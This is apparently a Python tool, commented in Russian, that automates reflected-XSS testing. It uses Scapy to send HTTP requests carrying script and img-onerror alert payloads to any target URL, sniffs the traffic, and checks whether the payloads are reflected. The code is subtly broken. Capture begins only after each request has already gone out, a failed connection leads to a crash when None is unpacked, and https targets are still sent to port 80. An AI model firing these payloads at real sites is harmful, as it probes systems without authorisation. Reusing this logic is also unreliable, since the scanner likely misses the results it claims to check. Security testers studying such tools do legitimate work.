import argparse
import socket
import random
import time
from urllib.parse import urlparse
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr1, send
from scapy.all import sniff, wrpcap, rdpcap

# Список полезных нагрузок (payloads)
PAYLOADS = ["<script>alert('XSS')</script>", '<img src=x onerror="alert(\'XSS\');">']

def resolve_hostname(hostname):
    """Разрешает доменное имя в IP-адрес."""
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as e:
        print(f"Ошибка разрешения доменного имени '{hostname}': {e}")
        return None

def parse_url(url_arg):
    """Парсит URL и извлекает hostname, path и схему."""
    if not url_arg.startswith('http://') and not url_arg.startswith('https://'):
        url_arg = 'http://' + url_arg
    try:
        parsed = urlparse(url_arg)
        hostname = parsed.hostname
        path = parsed.path if parsed.path else '/'
        scheme = parsed.scheme or 'http'
        return hostname, path, scheme
    except Exception as e:
        print(f"Ошибка парсинга URL: {e}")
        return None, None, None

def send_http_request(hostname, path, custom_request=None):
    """Отправляет HTTP-запрос через Scapy."""
    dest_ip = resolve_hostname(hostname)
    if not dest_ip:
        return None
    port = 80
    client_sport = random.randint(1025, 65500)
    if custom_request:
        http_request_str = custom_request
    else:
        http_request_str = f'GET {path} HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n'
    
    # Формируем SYN-пакет
    syn = IP(dst=dest_ip) / TCP(sport=client_sport, dport=port, flags='S')
    syn_ack = sr1(syn, timeout=5, verbose=False)
    if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 0x12:
        print(f"Не удалось установить соединение с {hostname}")
        return None
    
    # Ответ ACK на полученный SYN+ACK
    client_seq = syn_ack[TCP].ack
    client_ack = syn_ack[TCP].seq + 1
    ack_packet = IP(dst=dest_ip) / TCP(sport=client_sport, dport=port, seq=client_seq, ack=client_ack, flags='A')
    send(ack_packet, verbose=False)
    time.sleep(0.1)
    
    # Отправляем реальный HTTP-запрос
    http_request = IP(dst=dest_ip) / TCP(sport=client_sport, dport=port, seq=client_seq, ack=client_ack, flags='PA') / http_request_str
    send(http_request, verbose=False)
    return dest_ip, port, client_sport

def capture_traffic(hostname, iface="eth0", timeout=30, output_file=None):
    """Перехватывает HTTP-трафик для указанного хоста и сохраняет его в файл."""
    dest_ip = resolve_hostname(hostname)
    if not dest_ip:
        return None
    print(f"Начало перехвата трафика для {hostname} ({dest_ip})...")
    packets = sniff(iface=iface, filter=f"tcp and host {dest_ip}", timeout=timeout)
    print(f"Перехвачено пакетов: {len(packets)}")
    if output_file and packets:
        wrpcap(output_file, packets)
        print(f"Трафик сохранён в {output_file}")
    return packets

def generate_payload_request(hostname, path, payload):
    """Генерация HTTP-запроса с внедрением XSS payload."""
    request = (
        f'GET {path}?param={payload} HTTP/1.1\r\n'
        f'Host: {hostname}\r\n'
        'User-Agent: Mozilla/5.0\r\n'
        'Accept-Language: en-US,en;q=0.5\r\n'
        'Connection: close\r\n'
        '\r\n'
    )
    return request

def check_reflected_xss(response_body, payload):
    """Проверяет наличие конкретного payload в ответе."""
    return payload in response_body

def analyze_packets(packets):
    """Анализирует перехваченные пакеты на наличие XSS."""
    xss_found = False
    for packet in packets:
        if packet.haslayer('Raw'):
            try:
                body = packet['Raw'].load.decode(errors='replace')
                for payload in PAYLOADS:
                    if payload in body:
                        print(f"[+] Обнаружен возможный XSS-вектор: {payload}")
                        xss_found = True
            except UnicodeDecodeError:
                continue
    if not xss_found:
        print("[*] Отражённые XSS-векторы не обнаружены.")

def run_tests(hostname, path, output_file):
    """Запускает тесты с различными payloads и сохраняет весь трафик в одном файле."""
    all_packets = []
    for payload in PAYLOADS:
        request = generate_payload_request(hostname, path, payload)
        _, _, _ = send_http_request(hostname, path, request)
        captured_packets = capture_traffic(hostname)
        analyze_packets(captured_packets)
        all_packets.extend(captured_packets)
    if all_packets and output_file:
        wrpcap(output_file, all_packets)
        print(f"Весь трафик сохранён в {output_file}")
    return len(all_packets)

def main():
    parser = argparse.ArgumentParser(description='Автоматизированное тестирование XSS уязвимостей.')
    parser.add_argument('--target', required=True, help='Цель для тестирования (URL)')
    parser.add_argument('--output-file', default='/home/kali/traffic3.pcap', help='Имя файла для сохранения трафика')
    args = parser.parse_args()
    hostname, path, _ = parse_url(args.target)
    if not hostname:
        print("Ошибка: неверный URL")
        return
    print(f"Тестируемый хост: {hostname}, путь: {path}")
    total_packets = run_tests(hostname, path, args.output_file)
    print(f"Сохранено всего {total_packets} пакетов.")

if __name__ == '__main__':
    main()
